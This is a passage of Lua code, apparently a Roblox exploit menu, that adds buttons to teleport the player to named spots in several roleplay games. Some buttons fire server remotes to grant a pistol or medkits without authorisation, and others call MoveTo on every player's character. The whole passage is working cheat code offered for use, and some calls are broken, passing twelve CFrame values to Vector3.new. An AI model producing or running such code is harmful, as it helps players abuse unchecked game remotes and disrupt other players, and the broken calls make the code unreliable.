        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-497.5661315917969, 3.3553056716918945, -1345.2403564453125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE MAIN DOOR [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-387.3024597167969, 44.56536102294922, 1706.3074951171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 1ST POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-273.4755554199219, 44.55963134765625, 1818.7889404296875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 2ND POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-495.6800231933594, 44.55963134765625, 1875.9793701171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------KALYE ONSE-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1428.125732421875, 40.41292190551758, -32.600135803222656)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1444.3717041015625, 40.38081741333008, 272.0224304199219)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1259.54150390625, 40.65171432495117, 167.2851104736328)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1127.585693359375, 40.649776458740234, -145.60560607910156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1040.086669921875, 43.81657791137695, -441.8215637207031)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(943.53857421875, 40.49576187133789, -20.645029067993164)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("COURT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1110.2763671875, 40.592098236083984, 100.20720672607422)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SCHOOL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1418.09277, 60.8931389, 118.621124, 0.0218539275, 5.62096893e-08, 0.999761164, 9.110245e-09, 1, -5.64222589e-08, -0.999761164, 1.03411173e-08, 0.0218539275)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE BDO [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-340.49237060546875, 41.12915802001953, 493.6236267089844)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE SMALL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-421.8565673828125, 40.2863883972168, -262.322265625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------FANTASY RP-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(990.8152465820312, 32.28494644165039, 296.9470520019531)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(580.9376220703125, 21.959636688232422, 265.1108093261719)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-737.8309326171875, 4.620716094970703, 292.19171142578125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-694.0562133789062, 7.702183723449707, 26.884098052978516)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 1 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-298.9566955566406, 48.019386291503906, -125.68920135498047)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE 2 [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(2962.96826171875, 42.9012451171875, 1055.046875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-283.9338684082031, 4.600690841674805, 323.8304443359375)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-713.2727661132812, 5.238117218017578, -264.2020263671875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("RED GARAGE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(1515.0609130859375, 4.029794692993164, -1342.2032470703125)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX START [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-353.32061767578125, 3.998025417327881, -91.46287536621094)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX LOCATE [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-351.8985900878906, 4.048017501831055, -27.99223518371582)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-808.3770141601562, 67.06934356689453, 2825.408935546875)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("LIMEYS [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-121.21233367919922, 20.518102645874023, 637.3209838867188)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KOPPE BEAN [FANTASY]", function()
	for _, p in pairs(game.Players:GetPlayers()) do
    if p.Character then p.Character:MoveTo(Vector3.new(-331.3203125, 20.13085174560547, 252.96755981445312)) end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-------------------------------CAVITE RP---------------------------", function()
    game:GetService("ReplicatedStorage").GiveAyuda:FireServer("Normal Pistol", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1006.0828857421875, 43.35292434692383, -186.58172607421875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-791.9968872070312, 4.168969631195068, -464.7488098144531)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1146.287109375, 3.9980430603027344, 69.46240997314453)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-723.1824951171875, 4.329793930053711, -1040.801025390625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOX BOX [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-389.4685363769531, 4.183757781982422, -52.90208435058594)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-701.1449584960938, 4.229806423187256, -1026.8604736328125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)   

--// 8 Buttons in Main Menu
addMainMenuButton("BLACK MARKET [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(310.0500183105469, 4.998108863830566, 1124.1072998046875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE HIGH GROUND [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(632.6267700195312, 40.997650146484375, -439.8812561035156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [CAVITE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-596.0802001953125, 13.955011367797852, 703.0349731445312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------BAGONG BARYO-----------------------------", function()
    game:GetService("ReplicatedStorage").GiveOxyBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1393.31591796875, 6.512001991271973, -573.355712890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [BAGONG BARYO]", function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(572.8681640625, 4.861981391906738, 211.42648315429688)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1163.9576416015625, 6.478593826293945, -548.2848510742188)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("ATM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1206.787109375, 7.270822525024414, -398.3341369628906)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(876.21923828125, 5.492217063903809, 602.9971313476562)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(243.63778686523438, 4.699999809265137, -978.7501831054688)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("UWU [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(863.9736938476562, 5.49222469329834, 184.72341918945312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1674.3304443359375, 54.93671417236328, 909.4314575195312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(874.050048828125, 9.073480606079102, -62.26642608642578)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MECH SHOP [BAGONG BARYO]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1284.14794921875, 5.208094596862793, 814.0725708007812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------PROMINENCE RP-----------------------------", function()
    game:GetService("ReplicatedStorage").GivePistolBox:FireServer("MEDKIT", -1)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-316.231689453125, 4.224208354949951, -278.7334289550781)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-318.2171325683594, 4.224208831787109, -14.7344388961792)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("STORAGE [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-255.43678283691406, 3.90071439743042, 87.1461410522461)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-557.5521240234375, 8.19964599609375, 255.06863403320312)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FISH FARM [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-765.808594, 11.4731388, -735.463379, 0.993488431, -6.31751078e-08, -0.113933206, 7.00669958e-08, 1, 5.64860798e-08, 0.113933206, -6.41012221e-08, 0.993488431)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TAMBAYAN [PROMINENCE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-837.4158935546875, 71.86466979980469, -756.404541015625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
